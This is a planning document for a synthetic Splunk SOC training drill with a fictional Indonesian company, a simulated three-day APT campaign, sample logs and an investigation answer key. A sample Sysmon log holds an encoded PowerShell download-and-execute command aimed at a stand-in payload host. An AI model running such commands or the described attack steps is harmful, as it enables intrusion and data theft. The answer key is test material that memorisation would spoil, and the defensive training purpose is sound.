# SOC Cyber Drill Dataset — Master Plan

> **Purpose:** Realistic correlated log dataset for Splunk-based SOC training  
> **Target:** ~50,000 events across 3 days  
> **Attack:** 1 full APT-style kill chain campaign  

---

## 1. Environment — "PT Nusantara Digital" (Fictional Company)

### Network Topology

```
                    ┌─────────────┐
                    │  INTERNET   │
                    └──────┬──────┘
                           │
                    ┌──────┴──────┐
                    │  FW-EDGE-01 │  Palo Alto (simulated)
                    │ 203.0.113.1 │  
                    └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              │            │            │
        ┌─────┴─────┐ ┌───┴────┐ ┌────┴─────┐
        │    DMZ     │ │ CORP   │ │  SERVER  │
        │ 10.10.1.0  │ │ 10.10  │ │  10.10   │
        │   /24      │ │ 2.0/24 │ │  3.0/24  │
        └─────┬─────┘ └───┬────┘ └────┬─────┘
              │            │            │
        WEB-SERVER-01  WS-FINANCE-01  DC-01
        10.10.1.10     10.10.2.50     10.10.3.10
        (Ubuntu 22.04) (Win 11)       (Win Server 2022)
                       WS-HR-02       DB-SERVER-01
                       10.10.2.51     10.10.3.20
                       (Win 11)       (Ubuntu 22.04)
```

### Asset Inventory

| Hostname | IP | OS | Role | Log Sources |
|----------|----|----|------|-------------|
| **FW-EDGE-01** | 203.0.113.1 (ext) / 10.10.0.1 (int) | PAN-OS | Edge firewall/router | Firewall traffic logs, DNS proxy logs |
| **WEB-SERVER-01** | 10.10.1.10 | Ubuntu 22.04 | Apache web server (public-facing) | Suricata (IDS), Apache access/error, auditd, syslog |
| **DC-01** | 10.10.3.10 | Windows Server 2022 | Domain Controller | Windows Security Events, Sysmon |
| **WS-FINANCE-01** | 10.10.2.50 | Windows 11 | Finance dept workstation | Windows Security Events, Sysmon |
| **WS-HR-02** | 10.10.2.51 | Windows 11 | HR dept workstation | Windows Security Events, Sysmon |
| **DB-SERVER-01** | 10.10.3.20 | Ubuntu 22.04 | MySQL database server | auditd, syslog, MySQL slow query |

### External IPs (Attacker & Legitimate)

| IP | Role | Notes |
|----|------|-------|
| **45.77.65.211** | 🔴 Attacker C2 server | Hosted on Vultr, GeoIP: Netherlands |
| **185.234.216.88** | 🔴 Attacker staging | Bulletproof hosting, GeoIP: Russia |
| **91.215.85.142** | 🔴 Attacker scanner | Initial recon, GeoIP: Romania |
| 8.8.8.8, 1.1.1.1 | DNS resolvers | Normal traffic |
| 13.107.42.14 | Microsoft Update | Normal Windows traffic |
| 104.16.0.0/12 | Cloudflare | Normal web traffic |
| 142.250.x.x | Google services | Normal traffic |
| Various | Legitimate web browsing | ~20 different IPs for normal noise |

---

## 2. Timeline — 3 Day Scenario

### Day 1 (Monday) — Normal Operations + Reconnaissance

**Business hours: 08:00-18:00 WIB (UTC+7)**

| Time (WIB) | Event | Log Source | Category |
|------------|-------|------------|----------|
| 00:00-07:59 | Low traffic — cron jobs, backup, NTP | Linux syslog, auditd | Normal |
| 08:00-08:30 | Employees login — RDP, SMB, Kerberos | Windows 4624/4768, Sysmon 1 | Normal |
| 08:00-18:00 | Web browsing, email, file access | Firewall, DNS, Sysmon | Normal (noise) |
| 08:00-18:00 | Web server receives legitimate traffic | Apache access, Suricata | Normal |
| **09:15** | 🔴 **Recon: Port scan from 91.215.85.142** | Suricata (ET SCAN), Firewall deny | **Attack — Reconnaissance** |
| **09:15-09:20** | 🔴 **Recon: Web vulnerability scanning** | Apache access (404s, SQLi attempts), Suricata | **Attack — Reconnaissance** |
| 12:00-13:00 | Lunch — reduced activity | All | Normal |
| **14:30** | 🔴 **Phishing email delivered** (not in logs — email gateway) | — | **Attack — Delivery** |
| **14:47** | 🔴 **WS-FINANCE-01: User opens attachment** — macro executes | Sysmon 1 (WINWORD→cmd→powershell), Sysmon 3 (network), Sysmon 11 (file create) | **Attack — Execution** |
| **14:47-14:48** | 🔴 **PowerShell downloads payload from 185.234.216.88** | Sysmon 1 (encoded PS), Sysmon 3 (outbound), Sysmon 11, Suricata (ET POLICY), Firewall allow, DNS query | **Attack — Execution** |
| **14:49** | 🔴 **Payload establishes C2 beacon to 45.77.65.211:443** | Sysmon 3 (outbound 443), Firewall allow, DNS (resolve c2 domain) | **Attack — C2** |
| **14:50-17:30** | 🔴 **C2 beaconing every 60±10 seconds** | Sysmon 3, Firewall (HTTPS outbound regular interval) | **Attack — C2** |
| 18:00-23:59 | Employees logout, low traffic | Windows 4634, reduced firewall | Normal |
| **22:00-22:30** | 🔴 **C2 beacon continues (after hours)** | Sysmon 3, Firewall | **Attack — C2** |

### Day 2 (Tuesday) — Lateral Movement & Privilege Escalation

| Time (WIB) | Event | Log Source | Category |
|------------|-------|------------|----------|
| 00:00-07:59 | 🔴 C2 beacon continues overnight | Sysmon 3, Firewall | Attack — C2 |
| 08:00-08:30 | Normal employee logins | Windows 4624, Sysmon | Normal |
| **09:10** | 🔴 **Attacker runs discovery commands** via C2 | Sysmon 1 (whoami, ipconfig, net group, nltest, systeminfo), Windows 4688 | **Attack — Discovery** |
| **09:15** | 🔴 **Credential dumping: Invoke-Mimikatz** | Sysmon 1 (PS -enc), Sysmon 10 (process access LSASS), Windows 4688 | **Attack — Credential Access** |
| **09:20** | 🔴 **Pass-the-Hash to DC-01** | Windows 4624 (type 3, NTLM) on DC-01 from 10.10.2.50, Windows 4672 (admin logon) | **Attack — Lateral Movement** |
| **09:22** | 🔴 **New admin account created: "svc_backup"** | Windows 4720, 4728 (added to Domain Admins) on DC-01 | **Attack — Persistence** |
| **09:25** | 🔴 **Lateral move to DB-SERVER-01 via SSH** using stolen creds | Linux auth.log (SSH from 10.10.2.50), auditd (new session) | **Attack — Lateral Movement** |
| **09:30** | 🔴 **Scheduled task created on WS-FINANCE-01** for persistence | Sysmon 1 (schtasks.exe), Windows 4698 | **Attack — Persistence** |
| 10:00-17:00 | Normal business traffic + C2 beacon continues | All sources | Normal + Attack |
| **14:00** | 🔴 **DB dump: mysqldump on DB-SERVER-01** | auditd (exec mysqldump), Linux syslog | **Attack — Collection** |
| **14:05** | 🔴 **Data compressed: tar + gzip** | auditd (exec tar), syslog | **Attack — Collection** |
| **15:00** | 🔴 **Data staged to /tmp/bak.tar.gz** | auditd (file write /tmp) | **Attack — Staging** |
| 18:00-23:59 | Normal after-hours + C2 beacon | All | Normal + Attack |

### Day 3 (Wednesday) — Exfiltration & Cleanup

| Time (WIB) | Event | Log Source | Category |
|------------|-------|------------|----------|
| 00:00-07:59 | C2 beacon + normal overnight | All | Normal + Attack |
| **02:30** | 🔴 **Data exfiltration: curl upload to 185.234.216.88** | auditd (exec curl), Firewall (large outbound transfer ~250MB), Suricata (ET POLICY) | **Attack — Exfiltration** |
| **02:35** | 🔴 **Cleanup: remove staged files, clear bash history** | auditd (exec rm, history -c), syslog | **Attack — Defense Evasion** |
| **02:40** | 🔴 **Attacker clears Windows event logs on WS-FINANCE-01** | Windows 1102 (log cleared), Sysmon 1 (wevtutil.exe) | **Attack — Defense Evasion** |
| 08:00-18:00 | Normal business day | All | Normal |
| **10:00** | 🔴 C2 beacon continues (attacker maintains access) | Sysmon 3, Firewall | **Attack — C2** |

---

## 3. Log Sources & Volume Distribution

### Target: ~50,000 events total

| Source | Sourcetype (Splunk) | Est. Events | Content |
|--------|---------------------|-------------|---------|
| **Firewall** (FW-EDGE-01) | `pan:traffic` | ~15,000 | Allow/deny, src/dst IP, port, bytes, app, action. Mix of normal browsing + attack traffic |
| **DNS** (FW-EDGE-01) | `pan:dns` | ~8,000 | DNS queries with domain, query type, response. Include suspicious domains for C2 |
| **Suricata** (WEB-SERVER-01) | `suricata` | ~5,000 | IDS alerts (ET rules) + flow logs. Port scan alerts, web attack alerts, policy violations |
| **Windows Security** (DC-01, WS-FINANCE-01, WS-HR-02) | `WinEventLog:Security` | ~12,000 | EventCodes: 4624/4625/4634/4648/4672/4688/4720/4728/4698/1102/4768/4769 |
| **Sysmon** (DC-01, WS-FINANCE-01, WS-HR-02) | `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` | ~6,000 | EventIDs: 1 (process), 3 (network), 7 (image load), 10 (process access), 11 (file create), 13 (registry), 22 (DNS) |
| **Linux auditd** (WEB-SERVER-01, DB-SERVER-01) | `linux:audit` | ~3,000 | SYSCALL/EXECVE events: command execution, file access, network connections |
| **Linux syslog** (WEB-SERVER-01, DB-SERVER-01) | `syslog` | ~1,500 | Auth (SSH login/fail), cron, systemd, kernel messages |
| **Apache** (WEB-SERVER-01) | `apache:access` | ~2,000 | HTTP access logs: normal requests + scanning/SQLi/XSS attempts from attacker |

**Total: ~52,500 events**

---

## 4. MITRE ATT&CK Mapping

| Phase | Technique | ID | Log Evidence |
|-------|-----------|-----|-------------|
| Reconnaissance | Active Scanning | T1595 | Suricata: ET SCAN alerts, Firewall: multi-port denies from 91.215.85.142 |
| Initial Access | Phishing Attachment | T1566.001 | Sysmon 1: WINWORD.EXE → cmd.exe → powershell.exe chain |
| Execution | PowerShell | T1059.001 | Sysmon 1: powershell.exe with -enc (Base64), Windows 4688 |
| Execution | User Execution | T1204.002 | Sysmon 1: user opened malicious document |
| Persistence | Scheduled Task | T1053.005 | Windows 4698, Sysmon 1: schtasks.exe /create |
| Persistence | Create Account | T1136.002 | Windows 4720: user "svc_backup" created |
| Privilege Escalation | Domain Admin | T1078.002 | Windows 4728: added to Domain Admins group |
| Defense Evasion | Indicator Removal | T1070.001 | Windows 1102: Security log cleared |
| Defense Evasion | Obfuscated Files | T1027 | Sysmon 1: Base64 encoded PowerShell |
| Credential Access | OS Credential Dumping | T1003.001 | Sysmon 10: process accessed LSASS |
| Discovery | System Info | T1082 | Sysmon 1: systeminfo.exe, ipconfig.exe |
| Discovery | Domain Trust | T1482 | Sysmon 1: nltest.exe /domain_trusts |
| Discovery | Permission Groups | T1069.002 | Sysmon 1: net group "Domain Admins" |
| Lateral Movement | Pass the Hash | T1550.002 | Windows 4624 type 3 (NTLM) on DC-01 |
| Lateral Movement | SSH | T1021.004 | Linux auth.log: SSH login from 10.10.2.50 |
| Collection | Data from DB | T1005 | auditd: mysqldump execution |
| Exfiltration | Exfil Over C2 | T1041 | auditd: curl to 185.234.216.88, Firewall: large transfer |
| Command & Control | Web Protocols | T1071.001 | Sysmon 3: HTTPS to 45.77.65.211, regular beacon interval |

---

## 5. Noise / Normal Traffic Patterns

Supaya log terasa natural, background noise harus dominan (~90% of total events).

### Normal DNS Queries (~7,500 of 8,000)
- google.com, gmail.com, youtube.com, facebook.com, instagram.com, twitter.com
- microsoft.com, office.com, windows.com, windowsupdate.com
- amazonaws.com, cloudfront.net, akamai.net
- Internal: dc-01.nusantara.local, db-server-01.nusantara.local
- Random legitimate Indonesian sites: detik.com, kompas.com, tokopedia.com, etc.

### Normal Firewall Traffic (~14,000 of 15,000)
- HTTPS (443) outbound to various CDN/cloud IPs
- HTTP (80) occasional
- DNS (53) to 8.8.8.8, 1.1.1.1
- SMB (445) internal between workstations and DC
- RDP (3389) internal to servers
- NTP (123), LDAP (389/636), Kerberos (88)
- Some deny logs: random internet scanners hitting the external IP

### Normal Windows Events (~10,000 of 12,000)
- 4624: Successful logons (interactive, network, batch, service)
- 4634: Logoff events
- 4768/4769: Kerberos TGT/TGS (normal domain auth)
- 4688: Normal process creation (explorer, chrome, outlook, teams)
- Random 4625: Mistyped password (1-2 per user per day)

### Normal Sysmon (~5,000 of 6,000)
- Event 1: chrome.exe, teams.exe, outlook.exe, explorer.exe, svchost.exe
- Event 3: Outbound connections to Microsoft, Google, Cloudflare
- Event 22: DNS queries for normal domains
- Event 11: Temp files from Office, browser cache
- Event 13: Normal registry changes from Windows Update

### Normal Linux (~3,500 of 4,500)
- SSH logins from admin (10.10.2.50, 10.10.3.10) — successful
- Cron jobs (every 5 min: monitoring, log rotation, backup)
- Apache access: normal web requests (200 OK, legitimate user-agents)
- Package updates, systemd service starts

---

## 6. Key IOCs for Investigation

Peserta harus bisa menemukan IOC ini selama investigasi:

| IOC Type | Value | Context |
|----------|-------|---------|
| IP | 91.215.85.142 | Initial scanner/recon |
| IP | 185.234.216.88 | Payload staging + exfil destination |
| IP | 45.77.65.211 | C2 server |
| Domain | update-service.cloud | C2 domain (resolves to 45.77.65.211) |
| Domain | dl.techsupport-cdn.net | Payload download domain (resolves to 185.234.216.88) |
| Hash (SHA256) | e3b0c44298fc1c149afb... (placeholder) | Malicious payload dropped on WS-FINANCE-01 |
| File | C:\Users\ratna.finance\AppData\Local\Temp\svchost_update.exe | Dropped payload |
| File | /tmp/bak.tar.gz | Staged exfil data on DB-SERVER-01 |
| User | svc_backup | Backdoor account created by attacker |
| Scheduled Task | \Microsoft\Windows\Maintenance\SystemUpdate | Persistence mechanism |
| User-Agent | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1) | C2 beacon user-agent (outdated IE on Win11 = suspicious) |

---

## 7. Expected Investigation Flow (Answer Key)

Ini yang diharapkan peserta temukan saat investigasi di Splunk:

### Step 1: Detect Initial Anomaly
- Search: `index=* sourcetype=suricata alert.signature="ET SCAN*"` → find recon from 91.215.85.142
- Or: `index=* sourcetype="pan:traffic" action=deny src_ip=91.215.85.142` → firewall blocks

### Step 2: Find Phishing Execution
- Search: `index=* sourcetype=XmlWinEventLog EventCode=1 ParentImage="*WINWORD*"` → cmd.exe spawned by Word
- Pivot: `index=* sourcetype=XmlWinEventLog EventCode=1 host=WS-FINANCE-01 Image="*powershell*" CommandLine="*-enc*"` → encoded PS

### Step 3: Identify C2
- Search: `index=* sourcetype=XmlWinEventLog EventCode=3 DestinationIp=45.77.65.211` → C2 connections
- Or: `index=* sourcetype="pan:traffic" dest_ip=45.77.65.211 | timechart count span=5m` → beacon pattern

### Step 4: Track Lateral Movement
- Search: `index=* sourcetype=WinEventLog EventCode=4624 LogonType=3 src_ip=10.10.2.50 host=DC-01` → PTH to DC
- Search: `index=* sourcetype=syslog host=DB-SERVER-01 "Accepted" src_ip=10.10.2.50` → SSH lateral

### Step 5: Find Persistence
- Search: `index=* sourcetype=WinEventLog EventCode=4720` → new user svc_backup
- Search: `index=* sourcetype=WinEventLog EventCode=4728 Group_Name="Domain Admins"` → privesc
- Search: `index=* sourcetype=WinEventLog EventCode=4698` → scheduled task

### Step 6: Identify Data Exfiltration
- Search: `index=* sourcetype=linux:audit comm="mysqldump"` → DB dump
- Search: `index=* sourcetype="pan:traffic" dest_ip=185.234.216.88 bytes_out>1000000` → large transfer

### Step 7: Find Defense Evasion
- Search: `index=* sourcetype=WinEventLog EventCode=1102` → logs cleared
- Search: `index=* sourcetype=linux:audit comm="rm" | search "/tmp/bak"` → cleanup

---

## 8. Log Format Examples

### Firewall (pan:traffic format)
```
Apr 07 09:15:23 FW-EDGE-01 1,2026/04/07 09:15:23,001234567890,TRAFFIC,drop,2560,2026/04/07 09:15:23,91.215.85.142,203.0.113.1,0.0.0.0,0.0.0.0,deny-all,,,incomplete,vsys1,untrust,trust,ethernet1/1,,All-Logs,2026/04/07 09:15:23,0,1,54321,22,0,0,0x0,tcp,deny,60,60,0,1,2026/04/07 09:15:23,0,any,0,12345678,0x0,Netherlands,Indonesia,0,1,0,policy-deny,0,0,0,0,,FW-EDGE-01,from-policy,,,0,,0,,N/A,0,0,0,0,0,,2026-04-07T09:15:23.000+07:00,
```

### Suricata (EVE JSON)
```json
{"timestamp":"2026-04-07T09:15:25.123456+0700","flow_id":1234567890,"event_type":"alert","src_ip":"91.215.85.142","src_port":54321,"dest_ip":"10.10.1.10","dest_port":22,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2001219,"rev":20,"signature":"ET SCAN Potential SSH Scan","category":"Attempted Information Leak","severity":2},"flow":{"pkts_toserver":3,"pkts_toclient":0,"bytes_toserver":186,"bytes_toclient":0,"start":"2026-04-07T09:15:24.000000+0700"}}
```

### Windows Security (EventCode 4624)
```
04/07/2026 08:15:32 AM LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4624 EventType=0 Type=Information ComputerName=WS-FINANCE-01.nusantara.local TaskCategory=Logon Keywords=Audit Success Message=An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: WS-FINANCE-01$ Logon Type: 2 New Logon: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA Logon ID: 0x1A2B3C Network Information: Source Network Address: - Source Port: -
```

### Sysmon EventID 1 (Process Create)
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{...}"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-04-07T07:47:15.123Z"/>
    <Computer>WS-FINANCE-01.nusantara.local</Computer>
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1059.001</Data>
    <Data Name="UtcTime">2026-04-07 07:47:15.123</Data>
    <Data Name="ProcessId">5832</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBkAGwALgB0AGUAYwBoAHMAdQBwAHAAbwByAHQALQBjAGQAbgAuAG4AZQB0AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAnACkA</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">cmd.exe /c powershell.exe -nop -w hidden -enc ...</Data>
    <Data Name="User">NUSANTARA\ratna.finance</Data>
    <Data Name="ParentProcessId">4120</Data>
    <Data Name="Hashes">SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</Data>
  </EventData>
</Event>
```

### Linux auditd
```
type=SYSCALL msg=audit(1712451600.123:4521): arch=c000003e syscall=59 success=yes exit=0 a0=55b3a1234000 items=2 ppid=1234 pid=5678 auid=1000 uid=0 gid=0 euid=0 comm="mysqldump" exe="/usr/bin/mysqldump" key="program_exec"
type=EXECVE msg=audit(1712451600.123:4521): argc=5 a0="mysqldump" a1="--all-databases" a2="--single-transaction" a3="-u" a4="root"
```

### DNS (pan:dns format)
```
Apr 07 14:47:55 FW-EDGE-01 1,2026/04/07 14:47:55,001234567890,THREAT,dns,2560,2026/04/07 14:47:55,10.10.2.50,8.8.8.8,0.0.0.0,0.0.0.0,dns-default,,,dns-wildfire,vsys1,trust,untrust,ethernet1/2,,All-Logs,2026/04/07 14:47:55,0,1,52345,53,0,0,0x0,udp,allow,100,100,0,1,2026/04/07 14:47:55,dl.techsupport-cdn.net,any,0,12345679,0x0,Indonesia,Netherlands,0,1,0,0,0,,FW-EDGE-01,dns-log,A,185.234.216.88
```

---

## 9. Splunk Index & Sourcetype Plan

| Index | Sourcetype | Source |
|-------|-----------|--------|
| `firewall` | `pan:traffic` | FW-EDGE-01 traffic logs |
| `dns` | `pan:dns` | FW-EDGE-01 DNS proxy |
| `ids` | `suricata` | WEB-SERVER-01 Suricata EVE JSON |
| `windows` | `WinEventLog:Security` | DC-01, WS-FINANCE-01, WS-HR-02 |
| `sysmon` | `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` | DC-01, WS-FINANCE-01, WS-HR-02 |
| `linux` | `linux:audit` | WEB-SERVER-01, DB-SERVER-01 |
| `linux` | `syslog` | WEB-SERVER-01, DB-SERVER-01 |
| `web` | `apache:access` | WEB-SERVER-01 |

---

## 10. Delivery Method

1. Generate all logs as separate files per sourcetype
2. Upload to Splunk via `oneshot` or add as monitored files
3. Create Splunk indexes, configure sourcetypes with correct timestamp parsing
4. Verify searches return expected results per investigation step

---

## Approval Checklist

- [ ] Environment topology OK?
- [ ] Attack timeline realistic?
- [ ] Log sources & volume acceptable?
- [ ] MITRE ATT&CK mapping complete?
- [ ] Noise patterns natural enough?
- [ ] IOC list comprehensive?
- [ ] Investigation flow (answer key) makes sense?
- [ ] Log format examples accurate?
- [ ] Ready to execute?
